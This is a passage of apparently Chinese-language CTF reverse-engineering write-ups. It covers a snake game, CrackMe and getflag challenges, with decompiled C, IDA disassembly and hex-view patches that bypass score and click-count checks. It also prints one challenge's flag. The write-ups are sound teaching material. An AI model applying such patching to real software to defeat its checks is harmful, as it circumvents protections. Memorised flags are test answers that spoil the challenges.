class="number">97</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">68</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">77</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">100</span>:</span><br><span class="line">              <span class="keyword">if</span> ( v17 != <span class="number">97</span> )</span><br><span class="line">                v17 = <span class="number">100</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">72</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">87</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">119</span>:</span><br><span class="line">              <span class="keyword">if</span> ( v17 != <span class="number">115</span> )</span><br><span class="line">                v17 = <span class="number">119</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">80</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">83</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="number">115</span>:</span><br><span class="line">              <span class="keyword">if</span> ( v17 != <span class="number">119</span> )</span><br><span class="line">                v17 = <span class="number">115</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( v17 == <span class="number">100</span> )</span><br><span class="line">      {</span><br><span class="line">        v5 = v21 &gt; <span class="number">23</span> ? <span class="number">-24</span> : <span class="number">1</span>;</span><br><span class="line">        v21 += v5;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v17 &gt; <span class="number">100</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( v17 == <span class="number">115</span> )</span><br><span class="line">        {</span><br><span class="line">          v6 = v20 &gt; <span class="number">23</span> ? <span class="number">-24</span> : <span class="number">1</span>;</span><br><span class="line">          v20 += v6;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v17 == <span class="number">119</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( v20 &lt;= <span class="number">0</span> )</span><br><span class="line">            v7 = <span class="number">-24</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            v7 = <span class="number">1</span>;</span><br><span class="line">          v20 -= v7;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v17 == <span class="number">97</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( v21 &lt;= <span class="number">0</span> )</span><br><span class="line">          v4 = <span class="number">-24</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v4 = <span class="number">1</span>;</span><br><span class="line">        v21 -= v4;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( v14[<span class="number">25</span> * v20 + v21] &gt; <span class="number">1</span> || v14[<span class="number">25</span> * v20 + v21] == <span class="number">-2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v14[<span class="number">25</span> * v20 + v21] == <span class="number">-1</span> )</span><br><span class="line">      {</span><br><span class="line">        ++v19;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          i = rand() % <span class="number">625</span>;</span><br><span class="line">        <span class="keyword">while</span> ( v14[i] );</span><br><span class="line">        v14[i] = <span class="number">-1</span>;</span><br><span class="line">        sprintf_s(&amp;v11, <span class="number">32</span>, <span class="string">"title score:%d"</span>, v19 - <span class="number">4</span>);</span><br><span class="line">        system((<span class="type">const</span> <span class="type">char</span> *)&amp;v11);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">624</span>; ++i )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( v14[i] &gt; <span class="number">0</span> )</span><br><span class="line">            --v14[i];</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      v14[v21 + <span class="number">25</span> * v20] = v19;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1249</span>; ++i )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( v14[i / <span class="number">2</span>] )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( v14[i / <span class="number">2</span>] &lt;= <span class="number">0</span> )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( v14[i / <span class="number">2</span>] == <span class="number">-2</span> )</span><br><span class="line">            {</span><br><span class="line">              <span class="keyword">if</span> ( i &amp; <span class="number">1</span> )</span><br><span class="line">                v9 = <span class="number">93</span>;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                v9 = <span class="number">91</span>;</span><br><span class="line">              *((_BYTE *)&amp;v11 + i) = v9;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">              *((_BYTE *)&amp;v11 + i) = <span class="number">48</span>;</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( i &amp; <span class="number">1</span> )</span><br><span class="line">              v8 = <span class="number">41</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              v8 = <span class="number">40</span>;</span><br><span class="line">            *((_BYTE *)&amp;v11 + i) = v8;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          *((_BYTE *)&amp;v11 + i) = <span class="number">32</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      system(<span class="string">"cls"</span>);</span><br><span class="line">      <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v11);</span><br><span class="line">      sub_4020C0(v19);</span><br><span class="line">      Sleep(<span class="number">0x64</span>u);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( isFlag )</span><br><span class="line">    {</span><br><span class="line">      decode_flag(&amp;t_flag);</span><br><span class="line">      <span class="built_in">strcat</span>(s_flag, &amp;t_flag);</span><br><span class="line">      gameEndmenu(v19, s_flag);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      gameEndmenu(v19, flag);</span><br><span class="line">    }</span><br><span class="line">    result = _getch();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">while</span> ( result == <span class="number">32</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在第 192 行发现<code>sub_4020C0()</code>函数，双击查看</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_4020C0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = a1 - <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 - <span class="number">4</span> &gt; <span class="number">60</span> )</span><br><span class="line">    result = isFlag++ + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>果然发现了“60”，然后就是对其进行修改，在左侧函数栏中找到<code>sub_4020C0()</code>函数，切换到text view 状态</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00401C1C ; __unwind {</span><br><span class="line">.text:00401C1C                 push    ebp</span><br><span class="line">.text:00401C1D                 mov     ebp, esp</span><br><span class="line">.text:00401C1F                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:00401C22                 sub     eax, 4</span><br><span class="line">.text:00401C25                 cmp     eax, 3Ch     &lt;------3Ch转换为10进制为60</span><br><span class="line">.text:00401C28                 jle     short loc_401C37</span><br><span class="line">.text:00401C2A                 mov     eax, ds:_isFlag</span><br><span class="line">.text:00401C2F                 add     eax, 1</span><br><span class="line">.text:00401C32                 mov     ds:_isFlag, eax</span><br></pre></td></tr></tbody></table></figure><p>在 Hex View 中找到对应的地址，找到 3C 所在的位置</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220929210757529.png" alt="image-20220929210757529"><figcaption aria-hidden="true">image-20220929210757529</figcaption></figure><p>右键进行修改，改为<code>01</code>，然后通过下面的操作进行保存</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220929210917237.png" alt="image-20220929210917237"><figcaption aria-hidden="true">image-20220929210917237</figcaption></figure><p>再次运行该程序，得了两分后直接撞墙退出游戏，发现flag</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220929211044604.png" alt="image-20220929211044604"><figcaption aria-hidden="true">image-20220929211044604</figcaption></figure><p><code>NSSCTF{YourAreTheMasterOfGame!}</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF-HNCTF(自由赛道)</title>
    <link href="/2023/06/10/NSSCTF-HNCTF(%E8%87%AA%E7%94%B1%E8%B5%9B%E9%81%93)/"/>
    <url>/2023/06/10/NSSCTF-HNCTF(%E8%87%AA%E7%94%B1%E8%B5%9B%E9%81%93)/</url>
    
    <content type="html"><![CDATA[<p>平台：NSSCTF</p><p>比赛：HNCTF(自由赛道)</p><h2 id="crackme">CrackMe</h2><p>附件名称为：动调下断点。可知这题应该使用动态调试。</p><p>先使用IDA打开文件，查看文件信息。按 shift+F12查看是否有特殊字符串</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021200456398.png" alt="image-20221021200456398"><figcaption aria-hidden="true">image-20221021200456398</figcaption></figure><p>双击<code>.data:00403096   00000016    C   Congrats, u did it!!!</code>，定位到该字符串下，右击查看该字符串所在的函数</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021200815897.png" alt="image-20221021200815897"><figcaption aria-hidden="true">image-20221021200815897</figcaption></figure><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021200830149.png" alt="image-20221021200830149"><figcaption aria-hidden="true">image-20221021200830149</figcaption></figure><p>发现是在 DialogFunc 函数中，点击左侧函数名查看该函数</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021201601938.png" alt="image-20221021201601938"><figcaption aria-hidden="true">image-20221021201601938</figcaption></figure><p>分析视图逻辑，发现在打印最终的字符串之前进行了字符串的判断，猜测其中一个是flag</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021203157203.png" alt="image-20221021203157203"><figcaption aria-hidden="true">image-20221021203157203</figcaption></figure><p>双击查看这两个字符串的地址</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021203453448.png" alt="image-20221021203453448"><figcaption aria-hidden="true">image-20221021203453448</figcaption></figure><p>回到动态调试中，发现这两个字符串</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021203549793.png" alt="image-20221021203549793"><figcaption aria-hidden="true">image-20221021203549793</figcaption></figure><p>在第一个 String 处设置断点（F2），然后按 F9运行至断点处，弹出窗口要求我们进行输入，根据附件中的“要求.txt”，我在name 框中输入了“CreakMe”，按下“Check”按钮后，查看 String 内容</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021204246992.png" alt="image-20221021204246992"><figcaption aria-hidden="true">image-20221021204246992</figcaption></figure><p>窗口提示输入“Serial”，我便随便输入了几个数字，点击“About”按钮，然后按F8单步执行，无法成功，于是再次按下“Check”按钮，并再次尝试运行，单步执行成功，第一个String 和第二个均发生了改变，第二个 String 内容为我刚输入的内容</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021204726038.png" alt="image-20221021204726038"><figcaption aria-hidden="true">image-20221021204726038</figcaption></figure><p>猜测第一个 String 的内容为flag，尝试提交，flag正确。</p><h2 id="getflag">getflag</h2><p>使用IDA打开文件，直接F5查看伪代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  LPSTR v3; <span class="comment">// ebx</span></span><br><span class="line">  CHAR v4; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  HMODULE v6; <span class="comment">// eax</span></span><br><span class="line">  LPSTR v8; <span class="comment">// edx</span></span><br><span class="line">  CHAR v9; <span class="comment">// al</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [esp+0h] [ebp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> *v11; <span class="comment">// [esp+50h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = &amp;argc;</span><br><span class="line">  __main();</span><br><span class="line">  v3 = GetCommandLineA();</span><br><span class="line">  GetStartupInfoA(&amp;StartupInfo);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      v4 = *v3;</span><br><span class="line">      <span class="keyword">if</span> ( *v3 != <span class="number">32</span> &amp;&amp; v4 != <span class="number">9</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++v3;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">34</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      {</span><br><span class="line">        v8 = v3++;</span><br><span class="line">        v9 = *v3;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">while</span> ( *v3 != <span class="number">34</span> &amp;&amp; v9 );</span><br><span class="line">      <span class="keyword">if</span> ( v9 == <span class="number">34</span> )</span><br><span class="line">        v3 = v8 + <span class="number">2</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">while</span> ( *v3 &amp; <span class="number">0xDF</span> &amp;&amp; *v3 != <span class="number">9</span> )</span><br><span class="line">        ++v3;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">while</span> ( *v3 == <span class="number">32</span> || *v3 == <span class="number">9</span> )</span><br><span class="line">      ++v3;</span><br><span class="line">  }</span><br><span class="line">  v5 = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> ( StartupInfo.dwFlags &amp; <span class="number">1</span> )</span><br><span class="line">    v5 = StartupInfo.wShowWindow;</span><br><span class="line">  v6 = GetModuleHandleA(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> WinMain(v6, <span class="number">0</span>, v3, v5);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发现第13行的 _main() 函数，双击查看</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __main()</span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = dword_40802C;</span><br><span class="line">  <span class="keyword">if</span> ( !dword_40802C )</span><br><span class="line">  {</span><br><span class="line">    dword_40802C = <span class="number">1</span>;</span><br><span class="line">    result = __do_global_ctors();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>没发现什么重要的函数，于是尝试运行该程序，发现需要点击 100000000次鼠标才能得到flag。（还是算了吧）</p><p>于是回到 main 函数中，跳过一些系统调用的函数，双击查看第48行的WinMain 函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nShowCmd)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  MSG Msg; <span class="comment">// [esp+34h] [ebp-54h]</span></span><br><span class="line">  WNDCLASSA WndClass; <span class="comment">// [esp+50h] [ebp-38h]</span></span><br><span class="line">  HWND v8; <span class="comment">// [esp+78h] [ebp-10h]</span></span><br><span class="line">  HWND hWnd; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  WndClass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">  WndClass.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">  WndClass.hbrBackground = (HBRUSH)<span class="number">6</span>;</span><br><span class="line">  WndClass.hCursor = <span class="number">0</span>;</span><br><span class="line">  WndClass.hIcon = <span class="number">0</span>;</span><br><span class="line">  WndClass.hInstance = hInstance;</span><br><span class="line">  WndClass.lpfnWndProc = WndProc;</span><br><span class="line">  WndClass.lpszClassName = <span class="string">"Main"</span>;</span><br><span class="line">  WndClass.lpszMenuName = <span class="number">0</span>;</span><br><span class="line">  WndClass.style = <span class="number">42</span>;</span><br><span class="line">  RegisterClassA(&amp;WndClass);</span><br><span class="line">  hWnd = GetForegroundWindow();</span><br><span class="line">  ShowWindow(hWnd, <span class="number">0</span>);</span><br><span class="line">  v8 = CreateWindowExA(<span class="number">0</span>, <span class="string">"Main"</span>, <span class="string">"flag"</span>, <span class="number">0xCF0000</span>u, <span class="number">200</span>, <span class="number">200</span>, <span class="number">430</span>, <span class="number">130</span>, <span class="number">0</span>, <span class="number">0</span>, hInstance, <span class="number">0</span>);</span><br><span class="line">  ShowWindow(v8, <span class="number">5</span>);</span><br><span class="line">  UpdateWindow(v8);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    *(HWND *)((<span class="type">char</span> *)&amp;Msg.hwnd + v4) = <span class="number">0</span>;</span><br><span class="line">    v4 += <span class="number">4</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">while</span> ( v4 &lt; <span class="number">0x1C</span> );</span><br><span class="line">  <span class="keyword">while</span> ( GetMessageA(&amp;Msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) )</span><br><span class="line">  {</span><br><span class="line">    TranslateMessage(&amp;Msg);</span><br><span class="line">    DispatchMessageA(&amp;Msg);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>双击查看 WndProc 函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">WndProc</span><span class="params">(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagRECT</span> <span class="title">Rect</span>;</span> <span class="comment">// [esp+3Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tagPAINTSTRUCT</span> <span class="title">Paint</span>;</span> <span class="comment">// [esp+4Ch] [ebp-4Ch]</span></span><br><span class="line">  HDC hDC; <span class="comment">// [esp+8Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( Msg == <span class="number">15</span> )</span><br><span class="line">  {</span><br><span class="line">    hDC = BeginPaint(hWnd, &amp;Paint);</span><br><span class="line">    GetClientRect(hWnd, &amp;Rect);</span><br><span class="line">    DrawTextA(hDC, <span class="string">"Click to get the flag."</span>, <span class="number">-1</span>, &amp;Rect, <span class="number">0x85</span>u);</span><br><span class="line">    EndPaint(hWnd, &amp;Paint);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( Msg &gt; <span class="number">0xF</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( Msg != <span class="number">16</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( Msg == <span class="number">273</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( wParam == <span class="number">1234</span> )</span><br><span class="line">          OnButtonClick();</span><br><span class="line">        <span class="keyword">if</span> ( wParam == <span class="number">4321</span> )</span><br><span class="line">          check();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">    }</span><br><span class="line">    DestroyWindow(hWnd);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( Msg == <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    CreateWindowExA(</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="string">"button"</span>,</span><br><span class="line">      <span class="string">"Click me."</span>,</span><br><span class="line">      <span class="number">0x50000000</span>u,</span><br><span class="line">      <span class="number">80</span>,</span><br><span class="line">      <span class="number">30</span>,</span><br><span class="line">      <span class="number">120</span>,</span><br><span class="line">      <span class="number">30</span>,</span><br><span class="line">      hWnd,</span><br><span class="line">      (HMENU)<span class="number">0x4D2</span>,</span><br><span class="line">      *(HINSTANCE *)(lParam + <span class="number">4</span>),</span><br><span class="line">      <span class="number">0</span>);</span><br><span class="line">    CreateWindowExA(</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="string">"button"</span>,</span><br><span class="line">      <span class="string">"Get flag"</span>,</span><br><span class="line">      <span class="number">0x50000000</span>u,</span><br><span class="line">      <span class="number">220</span>,</span><br><span class="line">      <span class="number">30</span>,</span><br><span class="line">      <span class="number">120</span>,</span><br><span class="line">      <span class="number">30</span>,</span><br><span class="line">      hWnd,</span><br><span class="line">      (HMENU)<span class="number">0x10E1</span>,</span><br><span class="line">      *(HINSTANCE *)(lParam + <span class="number">4</span>),</span><br><span class="line">      <span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( Msg != <span class="number">2</span> )</span><br><span class="line">    {</span><br><span class="line">LABEL_17:</span><br><span class="line">      DefWindowProcA(hWnd, Msg, wParam, lParam);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    MessageBoxA(<span class="number">0</span>, <span class="string">"Never gonna give you up."</span>, <span class="string">"Rick"</span>, <span class="number">0</span>);</span><br><span class="line">    PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>分析代码可确定最主要的代码就在这个函数中，双击查看 check() 函数</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int check()</span><br><span class="line">{</span><br><span class="line">  if ( click &gt; 99999999 )</span><br><span class="line">    return getflag();</span><br><span class="line">  sprintf(chk, "Click %d more times to get flag", 100000000 - click);</span><br><span class="line">  return MessageBoxA(0, chk, "Failed", 0);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发现最重要的判断语句，只需要修改点击次数就能快速获得flag。</p><p>回到 IDA View-A 窗口，点击 _check 函数</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021210814755.png" alt="image-20221021210814755"><figcaption aria-hidden="true">image-20221021210814755</figcaption></figure><p>点击空格键切换视图模式</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021210910536.png" alt="image-20221021210910536"><figcaption aria-hidden="true">image-20221021210910536</figcaption></figure><p>在 Hex 窗口中找到该地址</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021211008946.png" alt="image-20221021211008946"><figcaption aria-hidden="true">image-20221021211008946</figcaption></figure><p>右击选择 Edit，修改为<code>01 00 00 00</code>，注意内存中的存储顺序。然后通过下图进行保存</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021211427569.png" alt="image-20221021211427569"><figcaption aria-hidden="true">image-20221021211427569</figcaption></figure><p>运行修改后的程序，点击一次 Click me 按钮，再点击 Get flag按钮得到flag。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20221021211650450.png" alt="image-20221021211650450"><figcaption 